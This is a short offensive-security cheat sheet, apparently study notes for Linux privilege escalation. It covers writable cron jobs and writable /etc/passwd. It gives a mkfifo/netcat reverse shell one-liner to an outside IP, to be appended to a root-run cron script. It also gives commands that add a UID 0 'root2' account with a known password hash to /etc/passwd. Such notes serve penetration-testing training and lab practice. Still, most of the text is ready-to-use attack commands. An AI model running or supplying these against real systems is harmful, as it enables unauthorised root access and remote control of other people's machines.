
### Abusing Cron Jobs

First off, enumerate the system for cron jobs. once we've found some that are interesting we can follow some steps to attempt to exploit them.

`crontab -l` - user admin cronjobs that usually run as root that we could exploit
- try also running `sudo crontab -l` - this will reveal scripts that run as root if the user does not have any at their user level.

`grep "CRON" /var/log/syslog` - check sys log for cron logs

`cat /var/log/cron.log`  - check cron log for cron jobs

`cat <path_to_file>` inspect the files contents, to understand what the file does and how it could possibly be used

`ls -lah <path_to_file>` inspect file permission to see if we can utilize this file for privesc.

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> <path_to_file>` add a reverse shell one-liner to the file if we have the ability to write to the file. Setup a listener.

### Abusing Password Authentication

Unless a centralized password system is in use via AD or LDAP, linux passwords are generally stored in /etc/shadow.

However, If a password hash is present in the second column of a user in the /etc/passwd it is considered valid for authentication. `so, if we can write to /etc/passwd we can enable a known authentication method for any account on the system`.

below is an example of generating a new password for a new root account being added to the system users.

```
openssl passwd w00t

echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

su root2

w00t

id
```

